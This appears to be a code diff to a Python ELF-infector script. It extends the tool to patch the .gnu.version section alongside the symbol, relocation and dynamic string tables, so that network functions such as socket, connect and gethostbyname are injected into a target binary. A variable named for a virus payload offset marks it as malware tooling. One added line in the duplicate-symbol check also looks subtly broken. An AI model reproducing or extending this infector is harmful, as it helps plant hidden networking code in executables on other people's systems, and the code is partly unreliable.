@@ -276,8 +276,10 @@ def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
     
     return bytes(elf_bytearray)
 
+sym_versions = [2,2,2,2,2,4,2,2,3,2,2,0]
 symbol_names = [ "htons@GLIBC_2.2.5", "memset@GLIBC_2.2.5", "close@GLIBC_2.2.5", "read@GLIBC_2.2.5", "gethostbyname@GLIBC_2.2.5","memcpy@GLIBC_2.14","connect@GLIBC_2.2.5","socket@GLIBC_2.2.5", "__stack_chk_fail@GLIBC_2.4","write@GLIBC_2.2.5","strlen@GLIBC_2.2.5","usedforalign"]
 str_tab_entries = []
+
 def convert_functions_to_str_tab_entry():
     str_tab_entries.clear()
     for symbol in symbol_names:
@@ -293,6 +295,13 @@ def get_str_index_of_added_function(offset,sym_name_index):
     for i in range(sym_name_index):
         index = index + len(symbol_names[i]) + 1
     return index
+
+def add_versions_to_gnu_version(elf_object,file,offset):
+    sizes = []
+    for i in sym_versions:
+        sizes.append(2)
+    add_contents_to_file(offset,file,sym_versions,sizes)
+
 
 def add_strings_to_dyn_str_tab(elf_object,file,offset):
     sizes = []
@@ -328,6 +337,7 @@ def check_duplicate_symbols(elf_object):
     for i in range(num_symbols):
         #print(i,sym_tab.get_symbol(i)['st_info'])
         if sym_tab.get_symbol(i).name in symbol_names:
+            sym_versions.remove(symbol_names.index(sym_tab.get_symbol(i)))
             symbol_names.remove(sym_tab.get_symbol(i))
     #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)
 
@@ -336,7 +346,7 @@ def add_functions_to_dyn_sym(elf_object,file,offset,size,dyn_str_inject_offset):
     #offset = section['sh_offset'] + section['sh_size']
     for i in range(len(symbol_names)):
         name = get_str_index_of_added_function(dyn_str_inject_offset,i)
-        print("Name:",hex(name))
+        #print("Name:",hex(name))
         #print(hex(offset))
         add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],[4,1,1,2,8,8])
         offset+= size
@@ -352,12 +362,24 @@ def add_functions_to_sym_tab(elf_object,file):
 
 def add_functions_to_rela_plt(elf_object,file):
     section = elf_object.get_section_by_name(".rela.plt")
-    for i in range(section.num_relocations()):
-        print(section.get_relocation(i))
+    #for i in range(section.num_relocations()):
+        #print(section.get_relocation(i))
     offset = section['sh_offset'] + section['sh_size']
     for i in range(len(symbol_names)):
         add_contents_to_file(offset,file,[0x0,0x7,0x0],[8,8,8])
         offset+= section['sh_entsize']
+
+def edit_gnu_version_section(elf_object,original_file,inject_offset,size):
+    section_header_table = elf_object['e_shoff']
+    section_header_size = elf_object['e_shentsize']
+    section_size_offset = 32
+    gnu_version_index = elf_object.get_section_index(".gnu.version")
+    gnu_version_section = elf_object.get_section_by_name(".gnu.version")
+    gnu_version_section_size = gnu_version_section['sh_size']
+    total_section_size_offset = section_header_table + section_header_size * gnu_version_index + section_size_offset
+    #print(hex(text_section_size))
+    modify_file(original_file,total_section_size_offset,(gnu_version_section_size+size).to_bytes(8,'little'))
+
 
 def edit_dyn_sym_section(elf_object,original_file,inject_offset,size):
     section_header_table = elf_object['e_shoff']
@@ -369,6 +391,7 @@ def edit_dyn_sym_section(elf_object,original_file,inject_offset,size):
     total_section_size_offset = section_header_table + section_header_size * dyn_sym_index + section_size_offset
     #print(hex(text_section_size))
     modify_file(original_file,total_section_size_offset,(dyn_sym_section_size+size).to_bytes(8,'little'))
+
 
 
 def edit_rela_plt_section(elf_object,original_file,inject_offset,size):
@@ -431,10 +454,10 @@ inject_offset = virus_payload_inject_offset
 
 ##### Testing
 
-print('sh_link',elf.get_section(6)['sh_link'])
+"""print('sh_link',elf.get_section(6)['sh_link'])
 section = elf.get_section(6)
 for i in range(section.num_symbols()):
-    print(section.get_symbol(i)['st_name'])
+    print(section.get_symbol(i)['st_name'])"""
 
 
 
@@ -444,6 +467,10 @@ for i in range(section.num_symbols()):
 check_duplicate_symbols(elf)
 convert_functions_to_str_tab_entry()
 
+#.gnu.version
+section = elf.get_section_by_name(".gnu.version")
+gnu_version_inject_offset = section['sh_offset'] + section['sh_size']
+gnu_version_size = len(sym_versions) * 2
 #.symtab
 section = elf.get_section_by_name(".symtab")
 sym_tab_inject_offset = section['sh_offset'] + section['sh_size'] #where the end of symble table is
@@ -466,13 +493,14 @@ sym_tab_offset = elf.get_section_by_name(".symtab")['sh_offset']
 rela_plt_offset = elf.get_section_by_name(".rela.plt")['sh_offset']
 dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset']
 dyn_str_offset = elf.get_section_by_name(".dynstr")['sh_offset']
+gnu_version_offset = elf.get_section_by_name(".gnu.version")['sh_offset']
 
 
-section_offsets = [sym_tab_offset,rela_plt_offset,dyn_str_offset,dyn_sym_offset]
-elf_sections_changes = ['.symtab','.rela.plt','.dynstr','.dynsym']
-elf_sections_changes_sizes = [sym_tab_size,rela_plt_size,dyn_str_size,dyn_sym_size]
+section_offsets = [sym_tab_offset,rela_plt_offset,gnu_version_offset,dyn_str_offset,dyn_sym_offset]
+elf_sections_changes = ['.symtab','.rela.plt','.gnu.version','.dynstr','.dynsym']
+elf_sections_changes_sizes = [sym_tab_size,rela_plt_size,gnu_version_size,dyn_str_size,dyn_sym_size]
 print("SIZES",elf_sections_changes_sizes)
-inject_offsets = [sym_tab_inject_offset,plt_inject_offset,dyn_str_inject_offset,dyn_sym_inject_offset]
+inject_offsets = [sym_tab_inject_offset,plt_inject_offset,gnu_version_inject_offset,dyn_str_inject_offset,dyn_sym_inject_offset]
 #print("Inject offsets:")
 #for offset in inject_offsets:
 #    print(hex(offset))
@@ -485,6 +513,7 @@ edit_elf_sections(elf,f,elf_sections_changes,elf_sections_changes_sizes)
 
 edit_sym_tab_section(elf,f,sym_tab_size)
 edit_rela_plt_section(elf,f,inject_offsets,rela_plt_size)
+edit_gnu_version_section(elf,f,inject_offsets,gnu_version_size)
 edit_dyn_str_section(elf,f,dyn_str_size)
 edit_dyn_sym_section(elf,f,inject_offsets,dyn_sym_size)
 modify_file(f,40,(elf['e_shoff']+sum(elf_sections_changes_sizes)).to_bytes(8,'little'))
@@ -494,8 +523,10 @@ dyn_sym_offset = elf.get_section_by_name(".dynsym")['sh_offset'] + elf.get_secti
 
 add_functions_to_sym_tab(elf,f)
 add_functions_to_rela_plt(elf,f)
+add_versions_to_gnu_version(elf,f,gnu_version_inject_offset)
 add_strings_to_dyn_str_tab(elf,f,dyn_str_inject_offset)
 add_functions_to_dyn_sym(elf,f,dyn_sym_offset,dyn_sym_size,dyn_str_inject_offset-dyn_str_offset)
+
 
 
 
